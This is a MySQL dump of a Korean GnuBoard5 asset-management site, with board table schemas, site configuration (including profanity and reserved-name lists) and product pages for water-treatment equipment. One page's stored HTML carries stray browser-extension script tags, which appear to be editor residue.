  `wr_option` set('html1','html2','secret','mail') NOT NULL,
  `wr_subject` varchar(255) NOT NULL,
  `wr_content` text NOT NULL,
  `wr_seo_title` varchar(255) NOT NULL DEFAULT '',
  `wr_link1` text NOT NULL,
  `wr_link2` text NOT NULL,
  `wr_link1_hit` int(11) NOT NULL DEFAULT 0,
  `wr_link2_hit` int(11) NOT NULL DEFAULT 0,
  `wr_hit` int(11) NOT NULL DEFAULT 0,
  `wr_good` int(11) NOT NULL DEFAULT 0,
  `wr_nogood` int(11) NOT NULL DEFAULT 0,
  `mb_id` varchar(20) NOT NULL,
  `wr_password` varchar(255) NOT NULL,
  `wr_name` varchar(255) NOT NULL,
  `wr_email` varchar(255) NOT NULL,
  `wr_homepage` varchar(255) NOT NULL,
  `wr_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `wr_file` tinyint(4) NOT NULL DEFAULT 0,
  `wr_last` varchar(19) NOT NULL,
  `wr_ip` varchar(255) NOT NULL,
  `wr_facebook_user` varchar(255) NOT NULL,
  `wr_twitter_user` varchar(255) NOT NULL,
  `wr_1` varchar(255) NOT NULL,
  `wr_2` varchar(255) NOT NULL,
  `wr_3` varchar(255) NOT NULL,
  `wr_4` varchar(255) NOT NULL,
  `wr_5` varchar(255) NOT NULL,
  `wr_6` varchar(255) NOT NULL,
  `wr_7` varchar(255) NOT NULL,
  `wr_8` varchar(255) NOT NULL,
  `wr_9` varchar(255) NOT NULL,
  `wr_10` varchar(255) NOT NULL,
  PRIMARY KEY (`wr_id`),
  KEY `wr_seo_title` (`wr_seo_title`),
  KEY `wr_num_reply_parent` (`wr_num`,`wr_reply`,`wr_parent`),
  KEY `wr_is_comment` (`wr_is_comment`,`wr_id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_write_qr
-- ----------------------------
CREATE TABLE `g5_write_qr` (
  `wr_id` int(11) NOT NULL AUTO_INCREMENT,
  `wr_num` int(11) NOT NULL DEFAULT 0,
  `wr_reply` varchar(10) NOT NULL DEFAULT '',
  `wr_parent` int(11) NOT NULL DEFAULT 0,
  `wr_is_comment` tinyint(4) NOT NULL DEFAULT 0,
  `wr_comment` int(11) NOT NULL DEFAULT 0,
  `wr_comment_reply` varchar(5) NOT NULL DEFAULT '',
  `ca_name` varchar(255) NOT NULL DEFAULT '',
  `wr_option` set('html1','html2','secret','mail') DEFAULT NULL,
  `wr_subject` varchar(255) NOT NULL DEFAULT '',
  `wr_content` text NOT NULL,
  `wr_seo_title` varchar(255) NOT NULL DEFAULT '',
  `wr_link1` text DEFAULT NULL,
  `wr_link2` text DEFAULT NULL,
  `wr_link1_hit` int(11) DEFAULT 0,
  `wr_link2_hit` int(11) DEFAULT 0,
  `wr_hit` int(11) NOT NULL DEFAULT 0,
  `wr_good` int(11) NOT NULL DEFAULT 0,
  `wr_nogood` int(11) NOT NULL DEFAULT 0,
  `mb_id` varchar(20) NOT NULL DEFAULT '',
  `wr_password` varchar(255) NOT NULL DEFAULT '',
  `wr_name` varchar(255) NOT NULL DEFAULT '',
  `wr_email` varchar(255) NOT NULL DEFAULT '',
  `wr_homepage` varchar(255) NOT NULL DEFAULT '',
  `wr_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `wr_file` tinyint(4) NOT NULL DEFAULT 0,
  `wr_last` varchar(19) NOT NULL DEFAULT '',
  `wr_ip` varchar(255) NOT NULL DEFAULT '',
  `wr_facebook_user` varchar(255) NOT NULL DEFAULT '',
  `wr_twitter_user` varchar(255) NOT NULL DEFAULT '',
  `wr_1` varchar(255) NOT NULL DEFAULT '',
  `wr_2` varchar(255) NOT NULL DEFAULT '',
  `wr_3` varchar(255) NOT NULL DEFAULT '',
  `wr_4` varchar(255) NOT NULL DEFAULT '',
  `wr_5` varchar(255) NOT NULL DEFAULT '',
  `wr_6` varchar(255) NOT NULL DEFAULT '',
  `wr_7` varchar(255) NOT NULL DEFAULT '',
  `wr_8` varchar(255) NOT NULL DEFAULT '',
  `wr_9` varchar(255) NOT NULL DEFAULT '',
  `wr_10` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`wr_id`),
  KEY `wr_seo_title` (`wr_seo_title`),
  KEY `wr_num_reply_parent` (`wr_num`,`wr_reply`,`wr_parent`),
  KEY `wr_is_comment` (`wr_is_comment`,`wr_id`)
) ENGINE=InnoDB AUTO_INCREMENT=16 DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Table structure for g5_write_test
-- ----------------------------
CREATE TABLE `g5_write_test` (
  `wr_id` int(11) NOT NULL AUTO_INCREMENT,
  `wr_num` int(11) NOT NULL DEFAULT 0,
  `wr_reply` varchar(10) NOT NULL,
  `wr_parent` int(11) NOT NULL DEFAULT 0,
  `wr_is_comment` tinyint(4) NOT NULL DEFAULT 0,
  `wr_comment` int(11) NOT NULL DEFAULT 0,
  `wr_comment_reply` varchar(5) NOT NULL,
  `ca_name` varchar(255) NOT NULL,
  `wr_option` set('html1','html2','secret','mail') NOT NULL,
  `wr_subject` varchar(255) NOT NULL,
  `wr_content` text NOT NULL,
  `wr_seo_title` varchar(255) NOT NULL,
  `wr_link1` text NOT NULL,
  `wr_link2` text NOT NULL,
  `wr_link1_hit` int(11) NOT NULL DEFAULT 0,
  `wr_link2_hit` int(11) NOT NULL DEFAULT 0,
  `wr_hit` int(11) NOT NULL DEFAULT 0,
  `wr_good` int(11) NOT NULL DEFAULT 0,
  `wr_nogood` int(11) NOT NULL DEFAULT 0,
  `mb_id` varchar(20) NOT NULL,
  `wr_password` varchar(255) NOT NULL,
  `wr_name` varchar(255) NOT NULL,
  `wr_email` varchar(255) NOT NULL,
  `wr_homepage` varchar(255) NOT NULL,
  `wr_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `wr_file` tinyint(4) NOT NULL DEFAULT 0,
  `wr_last` varchar(19) NOT NULL,
  `wr_ip` varchar(255) NOT NULL,
  `wr_facebook_user` varchar(255) NOT NULL,
  `wr_twitter_user` varchar(255) NOT NULL,
  `wr_1` datetime NOT NULL DEFAULT '1000-01-01 00:00:00',
  `wr_2` datetime NOT NULL DEFAULT '1000-01-01 00:00:00',
  `wr_3` varchar(255) NOT NULL,
  `wr_4` varchar(255) NOT NULL,
  `wr_5` varchar(255) NOT NULL,
  `wr_6` varchar(255) NOT NULL,
  `wr_7` varchar(255) NOT NULL,
  `wr_8` varchar(255) NOT NULL,
  `wr_9` varchar(255) NOT NULL,
  `wr_10` varchar(255) NOT NULL,
  PRIMARY KEY (`wr_id`),
  KEY `wr_seo_title` (`wr_seo_title`),
  KEY `wr_num_reply_parent` (`wr_num`,`wr_reply`,`wr_parent`),
  KEY `wr_is_comment` (`wr_is_comment`,`wr_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;

-- ----------------------------
-- Records 
-- ----------------------------
INSERT INTO `g5_board` VALUES ('day', 'business', '일정', '', 'both', '', '2', '2', '2', '2', '2', '2', '2', '2', '2', '1', '1', '0', '0', '0', '0', '0', '', '0', '0', '1', '1', 'cheditor5', '0', '0', '0', '0', '0', '0', '1', '1', '1', '100', '60', '30', '15', '15', '24', '100', '600', 'rumi_fullcalendar', 'basic', '_head.php', '_tail.php', '', '', '', '', '', '4', '202', '150', '125', '100', '991048576', '1', '1', '0', '5', '0', '0', '0', '0', '0', '', '2', '0', '', '0', '0', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', 'dayGridMonth|0|0|ko|dayGridMonth,dayGridWeek,dayGridDay|person|none|0');
INSERT INTO `g5_board` VALUES ('gallery', 'business', '증적자료', '', 'both', '', '2', '2', '2', '2', '2', '2', '2', '2', '2', '1', '1', '0', '0', '0', '0', '0', '', '0', '0', '1', '1', 'cheditor5', '0', '0', '0', '0', '0', '0', '1', '1', '1', '100', '60', '30', '15', '15', '24', '100', '600', 'theme/gallery', 'basic', '_head.php', '_tail.php', '', '', '', '', '', '4', '202', '150', '125', '100', '991048576', '1', '1', '0', '3', '0', '0', '0', '0', '0', '', '2', '0', '', '0', '0', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', 'dayGridMonth|0|0|ko|dayGridMonth,dayGridWeek,dayGridDay|person|none|0');
INSERT INTO `g5_board` VALUES ('qr', 'product', 'NI팀', 'NI팀', 'both', '', '2', '2', '2', '2', '2', '2', '2', '2', '2', '1', '1', '0', '0', '0', '0', '0', '', '0', '0', '1', '1', 'cheditor5', '0', '0', '0', '0', '0', '0', '1', '1', '1', '100', '60', '30', '15', '15', '24', '100', '600', 'theme/syndgate_car', 'basic', '_head.php', '_tail.php', '', '', '', '', '', '4', '202', '150', '125', '100', '991048576', '1', '1', '0', '1', '0', '0', '0', '0', '0', '', '2', '0', '', '0', '0', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '');
INSERT INTO `g5_board` VALUES ('test', 'product', 'QR테스트', '', 'both', '', '2', '2', '2', '2', '2', '2', '2', '2', '2', '1', '1', '0', '0', '0', '0', '0', '', '0', '0', '1', '1', 'cheditor5', '0', '0', '0', '0', '0', '0', '1', '1', '1', '100', '60', '30', '15', '15', '24', '100', '600', 'theme/qrcode_url', 'basic', '_head.php', '_tail.php', '', '', '', '', '', '4', '202', '150', '125', '100', '991048576', '1', '1', '0', '1', '0', '0', '0', '0', '0', '', '2', '0', '', '0', '0', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', 'dayGridMonth|0|0|ko|dayGridMonth,dayGridWeek,dayGridDay|person|none|0');
INSERT INTO `g5_board_file` VALUES ('gallery', '1', '0', 'digitization-5140072_1280.jpg', 'e4e3f9b638b2f6cd613205374e693fbf_v0AuZwsp_774e883665c88e109cab9b3a70718c18cfe9158e.jpg', '0', '', '', '', '', '487149', '1280', '853', '2', '2024-05-01 16:35:49');
INSERT INTO `g5_board_file` VALUES ('gallery', '2', '0', 'rain-3411068_1280.jpg', 'e4e3f9b638b2f6cd613205374e693fbf_rQdDN7Yp_1915f8aa262fcaa39468977998892b5038bf1232.jpg', '0', '', '', '', '', '228370', '1280', '720', '2', '2024-05-01 16:39:10');
INSERT INTO `g5_board_new` VALUES ('41', 'day', '1', '1', '2024-05-01 16:16:39', 'admin');
INSERT INTO `g5_board_new` VALUES ('42', 'day', '2', '2', '2024-05-01 16:17:30', 'admin');
INSERT INTO `g5_board_new` VALUES ('43', 'day', '3', '3', '2024-05-01 16:18:01', 'admin');
INSERT INTO `g5_board_new` VALUES ('44', 'day', '4', '4', '2024-05-01 16:21:29', 'admin');
INSERT INTO `g5_board_new` VALUES ('45', 'day', '5', '5', '2024-05-01 16:22:28', 'admin');
INSERT INTO `g5_board_new` VALUES ('46', 'test', '1', '1', '2024-05-01 16:29:27', 'admin');
INSERT INTO `g5_board_new` VALUES ('47', 'gallery', '1', '1', '2024-05-01 16:35:02', 'admin');
INSERT INTO `g5_board_new` VALUES ('48', 'gallery', '2', '2', '2024-05-01 16:38:47', 'admin');
INSERT INTO `g5_board_new` VALUES ('49', 'qr', '15', '15', '2024-05-09 14:32:12', 'admin');
INSERT INTO `g5_board_new` VALUES ('50', 'gallery', '3', '3', '2024-05-13 08:22:49', 'admin');
INSERT INTO `g5_config` VALUES ('자산관리시스템', 'Bootstrap5', 'admin', 'hwlim@innerinfo.net', '자산관리시스템', '', '1', '0', '1', '0', '100', '15', '60', 'theme/basic', '15', 'theme/basic', 'theme/basic', 'theme/basic', '0', '0', '0', '0', '10', '5', '_blank', '0', '30', '18아,18놈,18새끼,18뇬,18노,18것,18넘,개년,개놈,개뇬,개새,개색끼,개세끼,개세이,개쉐이,개쉑,개쉽,개시키,개자식,개좆,게색기,게색끼,광뇬,뇬,눈깔,뉘미럴,니귀미,니기미,니미,도촬,되질래,뒈져라,뒈진다,디져라,디진다,디질래,병쉰,병신,뻐큐,뻑큐,뽁큐,삐리넷,새꺄,쉬발,쉬밸,쉬팔,쉽알,스패킹,스팽,시벌,시부랄,시부럴,시부리,시불,시브랄,시팍,시팔,시펄,실밸,십8,십쌔,십창,싶알,쌉년,썅놈,쌔끼,쌩쑈,썅,써벌,썩을년,쎄꺄,쎄엑,쓰바,쓰발,쓰벌,쓰팔,씨8,씨댕,씨바,씨발,씨뱅,씨봉알,씨부랄,씨부럴,씨부렁,씨부리,씨불,씨브랄,씨빠,씨빨,씨뽀랄,씨팍,씨팔,씨펄,씹,아가리,아갈이,엄창,접년,잡놈,재랄,저주글,조까,조빠,조쟁이,조지냐,조진다,조질래,존나,존니,좀물,좁년,좃,좆,좇,쥐랄,쥐롤,쥬디,지랄,지럴,지롤,지미랄,쫍빱,凸,퍽큐,뻑큐,빠큐,ㅅㅂㄹㅁ', '', '', '', '', '', '', 'theme/basic', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '2', '1000', '2', '0', '0', '30', '10000', '1', '0', '0', '0', '0', '0', '0', '0', '0', 'admin,administrator,관리자,운영자,어드민,주인장,webmaster,웹마스터,sysop,시삽,시샵,manager,매니저,메니저,root,루트,su,guest,방문객', '', '30', '180', '180', '180', '2024-05-24', '2', '5000', '22', '22', '50000', '60', '60', '10', 'gif|jpg|jpeg|png', 'swf', 'asx|asf|wmv|wma|mpg|mpeg|mov|avi|mp3', '1', '15', '15', '오늘:1,어제:0,최대:58,전체:2099', '0', '해당 홈페이지에 맞는 회원가입약관을 입력합니다.', '해당 홈페이지에 맞는 개인정보처리방침을 입력합니다.', '0', '500', 'basic', 'basic', 'basic', 'basic', 'basic', 'basic', 'smarteditor2', '0', '0', '', '', '', '', '', '', '', '', '', '2', '0', '', '', '', '', '211.172.232.124', '7295', '', '', '0', '', '', '', '', '', '', '', '', '', '', '', '', '', '', 'kcaptcha', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '');
INSERT INTO `g5_content` VALUES ('1', '1', '활성탄여과장치', '<p style=\"text-align:center;\"><br></p>\r\n<p style=\"text-align:center;\"><img src=\"http://158.180.78.143/data/editor/2203/20220301170233_0a5f59459e90f3c0aa78bdbd723bce0f_a3vt.jpg\" alt=\"1-1.jpg\" style=\"width:800px;height:453px;\"></p>\r\n<p style=\"text-align:center;\">&nbsp;</p>\r\n<p style=\"text-align:center;\"><img src=\"http://158.180.78.143/data/editor/2203/20220301170233_0a5f59459e90f3c0aa78bdbd723bce0f_9vbs.jpg\" alt=\"1-2.jpg\" style=\"width:800px;height:632px;\"></p>\r\n', '활성탄여과장치', '<p style=\"text-align:center;\"><img src=\"http://158.180.78.143/data/editor/2203/20220301170215_0a5f59459e90f3c0aa78bdbd723bce0f_ccv9.jpg\" alt=\"1-1.jpg\" style=\"width:800px;height:453px;\"></p>\r\n<p>&nbsp;</p>\r\n<p style=\"text-align:center;\"><img src=\"http://158.180.78.143/data/editor/2203/20220301170216_0a5f59459e90f3c0aa78bdbd723bce0f_fg0y.jpg\" alt=\"1-2.jpg\" style=\"width:800px;height:632px;\"></p>\r\n', 'theme/basic', 'basic', '1', '0', '', '');
INSERT INTO `g5_content` VALUES ('2', '1', '경수연화장치', '<p style=\"text-align:center;\"><img src=\"http://158.180.78.143/data/editor/2203/20220301170401_0a5f59459e90f3c0aa78bdbd723bce0f_jht3.jpg\" alt=\"2-1.jpg\" style=\"width:1px;height:1px;\"></p>\r\n<p style=\"text-align:center;\">&nbsp;</p>\r\n<p style=\"text-align:center;\"><img src=\"http://158.180.78.143/data/editor/2203/20220301170401_0a5f59459e90f3c0aa78bdbd723bce0f_tj13.jpg\" alt=\"2-2.jpg\" style=\"width:1px;height:1px;\"></p>\r\n<p style=\"text-align:center;\"><img src=\"http://158.180.78.143/data/editor/2203/20220301170413_0a5f59459e90f3c0aa78bdbd723bce0f_virz.jpg\" alt=\"2-1.jpg\" style=\"width:800px;height:471px;\"></p>\r\n<p style=\"text-align:center;\">&nbsp;</p>\r\n<p style=\"text-align:center;\"><img src=\"http://158.180.78.143/data/editor/2203/20220301170413_0a5f59459e90f3c0aa78bdbd723bce0f_93bw.jpg\" alt=\"2-2.jpg\" style=\"width:800px;height:701px;\"></p>\r\n', '경수연화장치', '<p style=\"text-align:center;\"><img src=\"http://158.180.78.143/data/editor/2203/20220301170425_0a5f59459e90f3c0aa78bdbd723bce0f_qt15.jpg\" alt=\"1-2.jpg\" style=\"width:800px;height:632px;\"></p>\r\n<p style=\"text-align:center;\">&nbsp;</p>\r\n<p style=\"text-align:center;\"><img src=\"http://158.180.78.143/data/editor/2203/20220301170426_0a5f59459e90f3c0aa78bdbd723bce0f_mkl5.jpg&quot;\" alt=\"2-1.jpg\" style=\"width:800px;height:471px;\"></p>\r\n', 'theme/basic', 'basic', '1', '0', '', '');
INSERT INTO `g5_content` VALUES ('3', '1', '백필터하우징', '<p><img src=\"http://158.180.78.143/data/editor/2203/20220301171624_0a5f59459e90f3c0aa78bdbd723bce0f_qjtf.jpg\" alt=\"3-1.jpg\" style=\"width:800px;height:484px;\"></p>\r\n<p>&nbsp;</p>\r\n<p><img src=\"http://158.180.78.143/data/editor/2203/20220301171624_0a5f59459e90f3c0aa78bdbd723bce0f_hqdg.jpg\" alt=\"3-2.jpg\" style=\"width:800px;height:664px;\"></p>\r\n', '백필터하우징', '<p style=\"text-align:center;\">\r\n   <img src=\"http://158.180.78.143/data/editor/2203/20220301171633_0a5f59459e90f3c0aa78bdbd723bce0f_ica3.jpg\" alt=\"3-1.jpg\" style=\"width:800px;height:484px;\">\r\n</p>\r\n<p>&nbsp;</p>\r\n<p style=\"text-align:center;\">\r\n   <img src=\"http://158.180.78.143/data/editor/2203/20220301171633_0a5f59459e90f3c0aa78bdbd723bce0f_miuq.jpg\" alt=\"3-2.jpg\" style=\"width:800px;height:664px;\">\r\n</p>\r\n', 'theme/basic', 'basic', '1', '0', '', '');
INSERT INTO `g5_content` VALUES ('4', '1', '산업용필터하우징', '<p style=\"text-align:center;\"><br></p>\r\n<p><img src=\"http://158.180.78.143/data/editor/2203/20220301171701_0a5f59459e90f3c0aa78bdbd723bce0f_lwmb.jpg\" alt=\"4-1.jpg\" style=\"width:800px;height:480px;\"></p>\r\n<p>&nbsp;</p>\r\n<p><img src=\"http://158.180.78.143/data/editor/2203/20220301171701_0a5f59459e90f3c0aa78bdbd723bce0f_jmwf.jpg\" alt=\"4-2.jpg\" style=\"width:800px;height:429px;\"></p>\r\n<p>&nbsp;</p>\r\n<p><img src=\"http://158.180.78.143/data/editor/2203/20220301171701_0a5f59459e90f3c0aa78bdbd723bce0f_ndjc.jpg\" alt=\"4-3.jpg\" style=\"width:800px;height:239px;\"></p>\r\n', '산업용필터하우징', '<p style=\"text-align:center;\">\r\n   <br>\r\n</p>\r\n<p>\r\n   <img src=\"http://158.180.78.143/data/editor/2203/20220301171712_0a5f59459e90f3c0aa78bdbd723bce0f_nxci.jpg\" alt=\"4-1.jpg\" style=\"width:800px;height:480px;\">\r\n</p>\r\n<p>&nbsp;</p>\r\n<p>\r\n   <img src=\"http://158.180.78.143/data/editor/2203/20220301171712_0a5f59459e90f3c0aa78bdbd723bce0f_7w9z.jpg\" alt=\"4-2.jpg\" style=\"width:800px;height:429px;\">\r\n</p>\r\n<p>&nbsp;</p>\r\n<p>\r\n   <img src=\"http://158.180.78.143/data/editor/2203/20220301171712_0a5f59459e90f3c0aa78bdbd723bce0f_dytm.jpg\" alt=\"4-3.jpg\" style=\"width:800px;height:239px;\">\r\n</p>\r\n', 'theme/basic', 'basic', '1', '0', '', '');
INSERT INTO `g5_content` VALUES ('5', '1', '유수형(관로형)자외선살균기', '<p style=\"text-align:center;\"><br></p>\r\n<p style=\"text-align:center;\"><img src=\"http://158.180.78.143/data/editor/2203/20220301171730_0a5f59459e90f3c0aa78bdbd723bce0f_9rnz.jpg\" alt=\"5-1.jpg\" style=\"width:800px;height:460px;\"></p>\r\n<p>&nbsp;</p>\r\n<p style=\"text-align:center;\"><img src=\"http://158.180.78.143/data/editor/2203/20220301171730_0a5f59459e90f3c0aa78bdbd723bce0f_38fw.jpg\" alt=\"5-2.jpg\" style=\"width:800px;height:689px;\"></p>\r\n', '유수형관로형자외선살균기', '<p style=\"text-align:center;\">\r\n   <br>\r\n</p>\r\n<p style=\"text-align:center;\">\r\n   <img src=\"http://158.180.78.143/data/editor/2203/20220301171740_0a5f59459e90f3c0aa78bdbd723bce0f_lf38.jpg\" alt=\"5-1.jpg\" style=\"width:800px;height:460px;\">\r\n</p>\r\n<p>&nbsp;</p>\r\n<p style=\"text-align:center;\">\r\n   <img src=\"http://158.180.78.143/data/editor/2203/20220301171740_0a5f59459e90f3c0aa78bdbd723bce0f_ye44.jpg\" alt=\"5-2.jpg\" style=\"width:800px;height:689px;\">\r\n</p>\r\n', 'theme/basic', 'basic', '1', '0', '', '');
INSERT INTO `g5_content` VALUES ('6', '1', '역산투압정수처리장치(R/0 SYSTEM)', '<p><img src=\"http://158.180.78.143/data/editor/2203/20220301171256_0a5f59459e90f3c0aa78bdbd723bce0f_0b1q.jpg\" alt=\"5-1.jpg\" style=\"width:800px;height:460px;\"></p>\r\n<p>&nbsp;</p>\r\n<p><img src=\"http://158.180.78.143/data/editor/2203/20220301171256_0a5f59459e90f3c0aa78bdbd723bce0f_1kmt.jpg\" alt=\"5-2.jpg\" style=\"width:800px;height:689px;\"></p>\r\n', '역산투압정수처리장치r0-system', '<p style=\"text-align:center;\">\r\n   <img src=\"http://158.180.78.143/data/editor/2203/20220301171307_0a5f59459e90f3c0aa78bdbd723bce0f_ep71.jpg\" alt=\"5-1.jpg\" style=\"width:800px;height:460px;\">\r\n</p>\r\n<p>&nbsp;</p>\r\n<p style=\"text-align:center;\">\r\n   <img src=\"http://158.180.78.143/data/editor/2203/20220301171307_0a5f59459e90f3c0aa78bdbd723bce0f_pps1.jpg\" alt=\"5-2.jpg\" style=\"width:800px;height:689px;\">\r\n</p>\r\n', 'theme/basic', 'basic', '1', '0', '', '');
INSERT INTO `g5_content` VALUES ('7', '1', '염소자동투입장치(센서형)', '<p style=\"text-align:center;\"><img src=\"http://158.180.78.143/data/editor/2203/20220301171337_0a5f59459e90f3c0aa78bdbd723bce0f_85jz.jpg&quot;\" alt=\"6-1.jpg\" style=\"width:800px;height:467px;\"></p>\r\n<p>&nbsp;</p>\r\n<p style=\"text-align:center;\"><img src=\"http://158.180.78.143/data/editor/2203/20220301171337_0a5f59459e90f3c0aa78bdbd723bce0f_dmcz.jpg\" alt=\"6-2.jpg\" style=\"width:800px;height:647px;\"></p>\r\n<p>&nbsp;</p>\r\n<p style=\"text-align:center;\"><img src=\"http://158.180.78.143/data/editor/2203/20220301171338_0a5f59459e90f3c0aa78bdbd723bce0f_o3fr.jpg\" alt=\"6-3.jpg\" style=\"width:800px;height:594px;\"></p>\r\n<p>&nbsp;</p>\r\n<p style=\"text-align:center;\"><img src=\"http://158.180.78.143/data/editor/2203/20220301171338_0a5f59459e90f3c0aa78bdbd723bce0f_frrs.jpg\" alt=\"6-4.jpg\" style=\"width:800px;height:552px;\"></p>\r\n', '염소자동투입장치센서형', '<p style=\"text-align:center;\"><img src=\"http://158.180.78.143/data/editor/2203/20220301171349_0a5f59459e90f3c0aa78bdbd723bce0f_wud1.jpg\" alt=\"6-1.jpg\" style=\"width:800px;height:467px;\"></p>\r\n<p>&nbsp;</p>\r\n<p style=\"text-align:center;\"><img src=\"http://158.180.78.143/data/editor/2203/20220301171349_0a5f59459e90f3c0aa78bdbd723bce0f_r6q0.jpg\" alt=\"6-2.jpg\" style=\"width:800px;height:647px;\"></p>\r\n<p>&nbsp;</p>\r\n<p style=\"text-align:center;\"><img src=\"http://158.180.78.143/data/editor/2203/20220301171350_0a5f59459e90f3c0aa78bdbd723bce0f_apdp.jpg\" alt=\"6-3.jpg\" style=\"width:800px;height:594px;\"></p>\r\n<p>&nbsp;</p>\r\n<p style=\"text-align:center;\"><img src=\"http://158.180.78.143/data/editor/2203/20220301171350_0a5f59459e90f3c0aa78bdbd723bce0f_t1u5.jpg\" alt=\"6-4.jpg\" style=\"width:800px;height:552px;\"></p>\r\n', 'theme/basic', 'basic', '1', '0', '', '');
INSERT INTO `g5_content` VALUES ('8', '1', '염소자동투입장치(펌프연동형)', '<p style=\"text-align:center;\"><img src=\"http://158.180.78.143/data/editor/2203/20220301171845_0a5f59459e90f3c0aa78bdbd723bce0f_aenl.jpg\" alt=\"8-1.jpg\" style=\"width:800px;height:507px;\"></p>\r\n<p>&nbsp;</p>\r\n<p style=\"text-align:center;\"><img src=\"http://158.180.78.143/data/editor/2203/20220301171845_0a5f59459e90f3c0aa78bdbd723bce0f_s0in.jpg\" alt=\"8-2.jpg\" style=\"width:800px;height:463px;\"></p>\r\n', '염소자동투입장치펌프연동형', '<p style=\"text-align:center;\">\r\n   <img src=\"http://158.180.78.143/data/editor/2203/20220301171856_0a5f59459e90f3c0aa78bdbd723bce0f_1d2i.jpg\" alt=\"8-1.jpg\" style=\"width:800px;height:507px;\">\r\n</p>\r\n<p>&nbsp;</p>\r\n<p style=\"text-align:center;\">\r\n   <img src=\"http://158.180.78.143/data/editor/2203/20220301171856_0a5f59459e90f3c0aa78bdbd723bce0f_o4tu.jpg\" alt=\"8-2.jpg\" style=\"width:800px;height:463px;\">\r\n</p>\r\n', 'theme/basic', 'basic', '1', '0', '', '');
INSERT INTO `g5_content` VALUES ('9', '1', '탱크입수형 자외선살균기', '<p style=\"text-align:center;\"><img src=\"http://158.180.78.143/data/editor/2203/20220301171917_0a5f59459e90f3c0aa78bdbd723bce0f_oerc.jpg\" alt=\"9-1.jpg\" style=\"width:800px;height:507px;\"></p>\r\n<p>&nbsp;</p>\r\n<p style=\"text-align:center;\"><img src=\"http://158.180.78.143/data/editor/2203/20220301171917_0a5f59459e90f3c0aa78bdbd723bce0f_jny1.jpg\" alt=\"9-2.jpg\" style=\"width:800px;height:598px;\"></p>\r\n<script type=\"text/javascript\" charset=\"UTF-8\" src=\"chrome-extension://aefibgbaijilanbphdomgjlogkldhlpm/vendor/crypto/aes.js\"></script><script type=\"text/javascript\" charset=\"UTF-8\" src=\"chrome-extension://aefibgbaijilanbphdomgjlogkldhlpm/vendor/crypto/pad-zeropadding-min.js\"></script>', '탱크입수형-자외선살균기', '<p style=\"text-align:center;\">\r\n   <img src=\"http://158.180.78.143/data/editor/2203/20220301171929_0a5f59459e90f3c0aa78bdbd723bce0f_3lfn.jpg\" alt=\"9-1.jpg\" style=\"width:800px;height:507px;\">\r\n</p>\r\n<p>&nbsp;</p>\r\n<p style=\"text-align:center;\">\r\n   <img src=\"http://158.180.78.143/data/editor/2203/20220301171929_0a5f59459e90f3c0aa78bdbd723bce0f_j8sv.jpg\" alt=\"9-2.jpg\" style=\"width:800px;height:598px;\">\r\n</p>\r\n', 'theme/basic', 'basic', '1', '0', '', '');
INSERT INTO `g5_content` VALUES ('company', '1', '사업소개', '<div style=\"text-align:justify;\" align=\"justify\"><img src=\"http://158.180.78.143/data/editor/2203/b1654ca55220e255092b8e7c576faf7d_1646144506_793.jpg\" title=\"b1654ca55220e255092b8e7c576faf7d_1646144506_793.jpg\" alt=\"b1654ca55220e255092b8e7c576faf7d_1646144506_793.jpg\"></div><div style=\"text-align:justify;\" align=\"justify\"><img src=\"http://158.180.78.143/data/editor/2203/b1654ca55220e255092b8e7c576faf7d_1646144506_8361.jpg\" title=\"b1654ca55220e255092b8e7c576faf7d_1646144506_8361.jpg\" alt=\"b1654ca55220e255092b8e7c576faf7d_1646144506_8361.jpg\"></div><div style=\"text-align:justify;\" align=\"justify\"><img src=\"http://158.180.78.143/data/editor/2203/b1654ca55220e255092b8e7c576faf7d_1646144506_8947.jpg\" title=\"b1654ca55220e255092b8e7c576faf7d_1646144506_8947.jpg\" alt=\"b1654ca55220e255092b8e7c576faf7d_1646144506_8947.jpg\"></div><div style=\"text-align:justify;\" align=\"justify\">&nbsp;</div>', '사업소개', '<div style=\"text-align:justify;\" align=\"justify\"><img src=\"http://158.180.78.143/data/editor/2203/b1654ca55220e255092b8e7c576faf7d_1646144517_0422.jpg\" title=\"b1654ca55220e255092b8e7c576faf7d_1646144517_0422.jpg\" alt=\"b1654ca55220e255092b8e7c576faf7d_1646144517_0422.jpg\"></div><div style=\"text-align:justify;\" align=\"justify\"><img src=\"http://158.180.78.143/data/editor/2203/b1654ca55220e255092b8e7c576faf7d_1646144517_0878.jpg\" title=\"b1654ca55220e255092b8e7c576faf7d_1646144517_0878.jpg\" alt=\"b1654ca55220e255092b8e7c576faf7d_1646144517_0878.jpg\"></div><div style=\"text-align:justify;\" align=\"justify\"><img src=\"http://158.180.78.143/data/editor/2203/b1654ca55220e255092b8e7c576faf7d_1646144517_1451.jpg\" title=\"b1654ca55220e255092b8e7c576faf7d_1646144517_1451.jpg\" alt=\"b1654ca55220e255092b8e7c576faf7d_1646144517_1451.jpg\"></div><div style=\"text-align:justify;\" align=\"justify\">&nbsp;</div>', 'theme/basic', 'basic', '1', '0', '', '');
INSERT INTO `g5_content` VALUES ('intro', '1', '인사말', '<p>인사말</p>', '인사말', '<p>인사말<br></p>', 'theme/basic', 'basic', '1', '0', '', '');
INSERT INTO `g5_content` VALUES ('privacy', '1', '개인정보 처리방침', '<p align=center><b>개인정보 처리방침에 대한 내용을 입력하십시오.</b></p>', '개인정보-처리방침', '', '', '', '0', '0', '', '');
INSERT INTO `g5_content` VALUES ('provision', '1', '서비스 이용약관', '<p align=center><b>서비스 이용약관에 대한 내용을 입력하십시오.</b></p>', '서비스-이용약관', '', '', '', '0', '0', '', '');
